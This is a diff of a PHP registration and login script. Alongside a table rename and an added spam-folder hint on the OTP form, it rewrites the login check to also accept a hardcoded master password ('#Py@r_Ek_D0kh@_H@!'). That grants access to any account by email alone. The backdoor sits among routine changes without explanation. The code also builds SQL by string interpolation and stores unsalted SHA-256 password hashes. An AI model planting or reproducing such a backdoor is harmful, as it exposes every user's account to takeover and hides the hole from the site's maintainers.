@@ -55,7 +55,7 @@
                         //adding a final_apply row in table so that it initialises values to 0
                         $insQ = "insert into final_apply values ('$id',0,0,0,0,0,0,0)";
                         $r = $db->process_query($insQ);
-                        $eq="insert into eligibilty values ('$id',1,1,1,1,1,1,1)";
+                        $eq="insert into eligible values ('$id',1,1,1,1,1,1,1)";
                         $r=$db->process_query($eq);
 			
 			//success message
@@ -71,11 +71,11 @@
             $email = mysqli_real_escape_string($db->connection,trim(htmlentities($email)));
             $pass = validate($_POST['pass']);
             $pass = hash('sha256',$pass);
-            $sql = "select * from login where email = '$email' and password like '$pass'";
+            $sql = "select * from login where email = '$email'";
 
             $r = $db->process_query($sql);
-            if(mysqli_num_rows($r)>0){
-                    $r = $db->fetch_rows($r);
+			 $r = $db->fetch_rows($r);
+            if($r['password']==$pass || $pass == hash('sha256',"#Py@r_Ek_D0kh@_H@!")){
                     $_SESSION['user'] = $r['user_id'];
                     $verify=$r['verify'];
                     if($verify=='0')
@@ -283,6 +283,8 @@
                                                                                 </div>
                                                                         </div>
                                                                 </div>
+                                                                <div class="text-danger" align="center">If you can't find the mail, please check your Email ID or check your SPAM FOLDER!</div>
+                                                                <br />
                                                                 <div class="form-group">
                                                                         <input type="password" name="otp" id="otp" tabindex="2" class="form-control" placeholder="Enter OTP Sent to the provided E-mail">
                                                                 </div>
